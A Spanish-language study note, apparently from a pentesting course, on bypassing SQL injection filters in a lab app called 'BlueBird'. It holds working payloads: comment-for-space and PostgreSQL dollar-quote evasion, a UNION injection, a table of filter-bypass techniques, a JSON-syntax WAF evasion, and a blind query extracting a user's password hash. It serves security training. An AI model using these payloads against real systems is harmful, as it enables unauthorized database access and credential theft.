---
tags:
  - Web/Red-Team
  - SQLi
  - Pentesting/Explotacion
Descripción: "La habilidad que de verdad separa al profesional en 2026 es explotar SQLi a pesar de los filtros: allowlists de caracteres, bloqueo de comillas o espacios, WAFs"
Fecha de actualización: 2026-06-04
Nota previa: "[[04 - Búsqueda de errores SQL en los logs]]"
Nota siguiente: "[[06 - SQL Injection basada en errores]]"
Area: "[[SQLi Avanzado.base|SQLi Avanzado]]"
---
---

La habilidad que de verdad separa al profesional en 2026 es **explotar SQLi a pesar de los filtros**: allowlists de caracteres, bloqueo de comillas o espacios, WAFs. Esta es la cara manual de la [[05 - Bypass de protecciones web con SQLMap|evasión que SQLMap automatiza con tamper scripts]], y conviene dominarla porque las herramientas fallan ante filtros a medida. El caso de `BlueBird` (`/find-user`) ilustra el método.

# Analizar el filtro

El endpoint aplica este filtro antes de concatenar la entrada `u` en `... LIKE '%<u>%'`:

```java
Pattern p = Pattern.compile("'|(.*'.*'.*)");
if (!u.toLowerCase().contains(" ") && !p.matcher(u).matches()) { /* ejecuta la query */ }
```

Bloquea **espacios** y el patrón de comillas. Pero hay un fallo: <mark style="background: #FF5582A6;">`Matcher.matches()` exige que el patrón case con la cadena **entera**</mark>, no con una parte (eso sería `find()`). El desarrollador asumió mal: el patrón `'|(.*'.*'.*)` solo bloquea una cadena que sea *exactamente* una comilla, o que tenga *dos* comillas. <mark style="background: #FFB86CA6;">Una entrada con **una sola** comilla en medio (`a'--`) no casa el patrón completo y pasa</mark>.

# Bypass de espacios: comentarios `/**/`

`a'--` se inyecta, pero `' and 1=1--` falla por el espacio. <mark style="background: #ADCCFFA6;">Los comentarios en línea `/**/` sustituyen a los espacios</mark>: el motor los interpreta como separador. Payload: `'/**/and/**/1=1--`. Funciona.

# Bypass de comillas: dollar quoting `$$`

Para un `UNION` necesitamos cadenas literales, normalmente entre comillas. <mark style="background: #8000E1A6;">PostgreSQL permite delimitar cadenas con `$$` en lugar de comillas</mark> (`$$texto$$` ≡ `'texto'`), esquivando el filtro. El `UNION` (tras hallar 6 columnas leyendo los logs) queda:

```sql
'/**/union/**/select/**/$$1$$,$$2$$,$$3$$,$$4$$,$$5$$,$$6$$--
```

# Arsenal general de evasión

El caso de BlueBird usa técnicas específicas de PostgreSQL, pero el repertorio es amplio y portable:

| Filtro que bloquea | Técnicas de bypass |
| ------------------ | ------------------ |
| **Espacios** | `/**/`, `%0a` (newline), `%09` (tab), `%0c`, `+`, paréntesis `(...)` |
| **Comillas** (`'`/`"`) | `$$...$$` (PostgreSQL), `CHAR(65,66)`/`CHR()`, hex `0x4142` (MySQL), contexto numérico (sin comillas) |
| **Keywords** (`UNION`, `SELECT`) | Case mixto (`UnIoN`), comentarios (`UN/**/ION`), `/*!50000UNION*/` (MySQL), doble palabra (`UNIUNIONON` si el filtro borra una vez) |
| **`=`** | `LIKE`, `BETWEEN`, `IN`, `<>` negado |
| **Coma** | `JOIN` en `UNION`, `OFFSET..FETCH`, `LIMIT N OFFSET M` |
| **Carácter genérico** | URL-encoding, double URL-encoding (`%2527`), Unicode, comentarios `/**/` intercalados |

> [!important]+
> La metodología: <mark style="background: #FF5582A6;">identifica qué bloquea el filtro (leyendo el código en white-box, o por prueba/error en caja negra), y sustituye cada elemento prohibido por un equivalente</mark>. Los [[04 - Búsqueda de errores SQL en los logs|logs SQL]] o el [[03 - Live-debugging de aplicaciones Java|debugger]] muestran exactamente cómo queda el payload tras el filtro, lo que acelera enormemente el ajuste.

# Evasión de WAF moderna: sintaxis JSON

Las técnicas anteriores burlan filtros de **aplicación**; contra un **WAF** comercial hace falta algo que su motor no sepa parsear. La técnica de referencia la publicó <mark style="background: #ADCCFFA6;">Team82 (Claroty) en 2022: los WAFs no interpretaban la sintaxis JSON dentro de SQL, mientras que los DBMS modernos (MySQL ≥5.7, PostgreSQL, MSSQL, SQLite) sí soportan operadores JSON</mark>. Incrustar JSON en el payload rompe el parser del WAF —que deja de reconocer la cadena como inyección— y la query llega intacta a la base de datos, que la ejecuta.

| Motor | Operadores / funciones JSON |
| - | - |
| MySQL | `->`, `->>`, `JSON_EXTRACT()` |
| PostgreSQL | `->`, `->>`, `#>`, `@>` |
| MSSQL | `JSON_VALUE()`, `JSON_QUERY()` |
| SQLite | `->`, `->>`, `JSON_EXTRACT()` |

Un payload que un WAF basado en firmas no marca como SQLi, pero MySQL evalúa sin problema:

```sql
1' OR JSON_EXTRACT('{"a":1}','$.a')=1-- -
```

> [!warning]+ Vigencia en 2026
> <mark style="background: #FFB8EBA6;">Tras la publicación, los grandes WAFs (AWS, Cloudflare, F5, Imperva, ModSecurity/CRS) parchearon</mark>, así que no esperes que funcione contra un WAF actualizado. Sigue viva contra WAFs desactualizados, reglas a medida y motores menos comunes. `sqlmap` incorpora *tampers* en esta línea. Es el ejemplo perfecto de la regla de 2026: <mark style="background: #8000E1A6;">contra un WAF con firmas no ofusques el payload conocido —usa una sintaxis que su parser no contemple</mark>.

# Optimización: precómputo comparativo (blind)

Si solo tuviéramos blind SQLi, en lugar de los [[05 - Optimización de la extracción|7 peticiones por carácter]] habituales, este endpoint permite **un carácter por petición**. El truco: hacer que el `id` buscado sea el valor ASCII del carácter objetivo, de modo que la respuesta (qué usuario aparece) revela el carácter:

```sql
'/**/AND/**/id=(SELECT/**/ASCII(SUBSTRING(password,1,1))/**/FROM/**/users/**/WHERE/**/username=$$itsmaria$$)--
```

Aparece el usuario con `id=36` → carácter `$` (los hashes son bcrypt `$2b$12$...`). <mark style="background: #FFB86CA6;">Aprovechar la estructura concreta de la app para extraer más por petición es una optimización que ninguna herramienta genérica encuentra</mark> —pura ventaja del enfoque manual—.

> [!warning]+
> Regla de oro al desarrollar exploits: <mark style="background: #8000E1A6;">prueba y desarrolla localmente</mark> (réplica del objetivo) antes de lanzar contra producción. Idealmente, cambiar IP/puerto debería ser el único ajuste. Y escribe un pequeño script que codifique el payload automáticamente (sustituir espacios y comillas) —tener la herramienta lista evita errores manuales en cada intento—.

Cuando la aplicación devuelve los errores de la base de datos, hay una técnica in-band aún más directa que el blind: [[06 - SQL Injection basada en errores]].
